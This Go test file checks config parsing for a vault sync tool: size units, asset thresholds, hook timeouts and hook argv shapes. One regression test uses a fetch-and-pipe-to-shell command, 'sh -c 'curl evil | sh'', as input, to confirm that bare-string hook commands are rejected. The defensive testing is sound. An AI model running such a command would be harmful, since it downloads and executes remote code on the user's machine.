package config

import (
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

func TestParseSizeTable(t *testing.T) {
	ok := []struct {
		in   string
		want int64
	}{
		{"0", 0},
		{"1", 1},
		{"1024", 1024},
		{"5B", 5},
		{"1KB", 1000},
		{"5MB", 5_000_000},
		{"2GB", 2_000_000_000},
		{"1KiB", 1 << 10},
		{"5MiB", 5 << 20},
		{"2GiB", 2 << 30},
		{"5 MB", 5_000_000},    // the regex tolerates inner space
		{"  5MB  ", 5_000_000}, // and surrounding space
	}
	for _, tc := range ok {
		t.Run(tc.in, func(t *testing.T) {
			got, err := ParseSize(tc.in)
			require.NoError(t, err)
			require.Equal(t, tc.want, got)
		})
	}

	bad := []string{
		"",            // empty
		"MB",          // unit with no number
		"-5MB",        // negative
		"5.5MB",       // fractional
		"5 megabytes", // prose
		"5TB",         // unit outside the supported set
		"0x10",        // hex
		"5MB extra",   // trailing junk
	}
	for _, in := range bad {
		t.Run("reject "+in, func(t *testing.T) {
			_, err := ParseSize(in)
			require.Error(t, err)
			require.ErrorContains(t, err, "bad size", "the error must name the offending value")
			require.ErrorContains(t, err, `"5MB"`, "and show a usable example")
		})
	}
}

// A size so large that unit multiplication would wrap int64 must be a clean
// config error, never a negative threshold that silently sends every asset
// to the CAS.
func TestParseSizeOverflowIsAnError(t *testing.T) {
	_, err := ParseSize("9223372036854775807GiB")
	require.ErrorContains(t, err, "overflows")

	// A 20-digit number does not fit int64 at all.
	_, err = ParseSize("99999999999999999999")
	require.Error(t, err)
}

// SPEC §31.2 pins the default as DECIMAL 5 MB, explicitly not 5 MiB: binary
// would sit ~5% over Obsidian Sync's Standard-plan cap and fail sync in the
// exact band the deviation exists to protect.
func TestDefaultAssetThresholdIsDecimalFiveMB(t *testing.T) {
	require.Equal(t, int64(5_000_000), int64(DefaultAssetThreshold))
	require.NotEqual(t, int64(5<<20), int64(DefaultAssetThreshold),
		"a binary 5 MiB default would break sync in the 5.00–5.24 MB band")
}

func TestAssetsDefaultsApplyWhenUnset(t *testing.T) {
	var a Assets
	require.NoError(t, a.validate("personal"))
	require.Equal(t, int64(DefaultAssetThreshold), a.ThresholdBytes)
	require.Equal(t, int64(100<<20), a.MaxDownloadBytes,
		"SPEC §31.3: the download cap must exceed the threshold or the CAS is unreachable")
}

func TestAssetsOverridesParse(t *testing.T) {
	a := Assets{Threshold: "200MB", MaxDownload: "1GiB"}
	require.NoError(t, a.validate("work"))
	require.Equal(t, int64(200_000_000), a.ThresholdBytes)
	require.Equal(t, int64(1<<30), a.MaxDownloadBytes)
}

func TestAssetsMaxDownloadMustExceedThreshold(t *testing.T) {
	// The §31.3 table constraint (BDFL gate condition 6): a cap at or
	// under the threshold makes every over-threshold download unreachable.
	a := Assets{Threshold: "200MiB"} // default max_download is 100 MiB
	err := a.validate("personal")
	require.ErrorContains(t, err, `vault "personal"`)
	require.ErrorContains(t, err, "must exceed threshold")

	a = Assets{Threshold: "10MB", MaxDownload: "10MB"} // equal is also unreachable
	err = a.validate("work")
	require.ErrorContains(t, err, "must exceed threshold")

	a = Assets{Threshold: "10MB", MaxDownload: "11MB"}
	require.NoError(t, a.validate("work"))
}

func TestAssetsBadSizeNamesTheVault(t *testing.T) {
	a := Assets{Threshold: "big"}
	err := a.validate("personal")
	require.ErrorContains(t, err, `vault "personal"`)
	require.ErrorContains(t, err, "[vaults.assets] threshold")

	a = Assets{MaxDownload: "huge"}
	err = a.validate("work")
	require.ErrorContains(t, err, `vault "work"`)
	require.ErrorContains(t, err, "[vaults.assets] max_download")
}

// The end-to-end config path: a [vaults.assets] table parses into the byte
// fields the pipeline reads, and every vault gets the defaults even when the
// table is absent.
func TestLoadVaultAssetsTable(t *testing.T) {
	p := writeConfig(t, `
version = 1

[defaults]
profile = "para"

[[vaults]]
name = "personal"
path = "/vaults/personal"

  [vaults.assets]
  threshold = "25MiB"
  max_download = "500MB"

[[vaults]]
name = "plain"
path = "/vaults/plain"
`)
	cfg, err := Load(p)
	require.NoError(t, err)
	require.Equal(t, int64(25<<20), cfg.Vaults[0].Assets.ThresholdBytes)
	require.Equal(t, int64(500_000_000), cfg.Vaults[0].Assets.MaxDownloadBytes)
	require.Equal(t, int64(DefaultAssetThreshold), cfg.Vaults[1].Assets.ThresholdBytes,
		"a vault with no [vaults.assets] table still gets a real threshold")
	require.Equal(t, int64(100<<20), cfg.Vaults[1].Assets.MaxDownloadBytes)
}

// hook_timeout: unset → the §31.7 default (10m); a positive override parses;
// a non-duration or non-positive value is a config error that names the vault
// and the key.
func TestAssetsHookTimeout(t *testing.T) {
	var a Assets
	require.NoError(t, a.validate("personal"))
	require.Equal(t, 10*time.Minute, a.HookTimeoutDur, "SPEC §31.7 default hook_timeout")

	a = Assets{HookTimeout: "30s"}
	require.NoError(t, a.validate("personal"))
	require.Equal(t, 30*time.Second, a.HookTimeoutDur)

	for _, bad := range []string{"nope", "0s", "-5m", "10"} {
		a = Assets{HookTimeout: bad}
		err := a.validate("work")
		require.Error(t, err, "hook_timeout %q must be rejected", bad)
		require.ErrorContains(t, err, `vault "work"`)
		require.ErrorContains(t, err, "hook_timeout")
	}
}

// validateHookArgv (via validate): an unset hook is fine; a present-but-empty
// array or one with a blank executable is a config error naming the vault and
// the key; a real argv passes (SPEC §31.7).
func TestAssetsHookArgvShapes(t *testing.T) {
	// Unset → no error (defaults still apply).
	a := Assets{}
	require.NoError(t, a.validate("personal"))

	// Valid argv on both keys.
	a = Assets{
		ProbeCmd:      []string{"ffprobe", "-hide_banner"},
		TranscribeCmd: []string{"whisper"},
	}
	require.NoError(t, a.validate("personal"))

	// Present-but-empty and blank-argv[0] are rejected, per key.
	for _, tc := range []struct {
		key  string
		set  Assets
		want string
	}{
		{"probe_cmd empty", Assets{ProbeCmd: []string{}}, "probe_cmd"},
		{"probe_cmd blank argv0", Assets{ProbeCmd: []string{""}}, "probe_cmd"},
		{"transcribe_cmd empty", Assets{TranscribeCmd: []string{}}, "transcribe_cmd"},
		{"transcribe_cmd blank argv0", Assets{TranscribeCmd: []string{"", "x"}}, "transcribe_cmd"},
	} {
		t.Run(tc.key, func(t *testing.T) {
			err := tc.set.validate("work")
			require.Error(t, err)
			require.ErrorContains(t, err, `vault "work"`)
			require.ErrorContains(t, err, tc.want)
			require.ErrorContains(t, err, "never a shell string")
		})
	}
}

// REGRESSION (fixed; SPEC §31.7 — "a bare string is a config error"). koanf's
// decode coerces a TOML string into a one-element []string, so before the
// fix `probe_cmd = "ffprobe -i"` loaded clean and failed at exec time on
// every media file. rejectScalarHookCmds now inspects the raw parsed type
// and rejects a scalar at load, matching the §24 password_cmd precedent.
func TestLoadRejectsBareStringHookCmd(t *testing.T) {
	for _, key := range []string{"probe_cmd", "transcribe_cmd"} {
		t.Run(key, func(t *testing.T) {
			p := writeConfig(t, `
version = 1

[defaults]
profile = "para"

[[vaults]]
name = "personal"
path = "/vaults/personal"

  [vaults.assets]
  `+key+` = "sh -c 'curl evil | sh'"
`)
			_, err := Load(p)
			require.Error(t, err,
				"SPEC §31.7: a bare string for %s must be a config error, never coerced to a one-element argv", key)
		})
	}
}

func TestLoadRejectsBadAssetThreshold(t *testing.T) {
	p := writeConfig(t, `
version = 1

[defaults]
profile = "para"

[[vaults]]
name = "personal"
path = "/vaults/personal"

  [vaults.assets]
  threshold = "five megs"
`)
	_, err := Load(p)
	require.ErrorContains(t, err, `vault "personal"`)
	require.ErrorContains(t, err, "threshold")
}
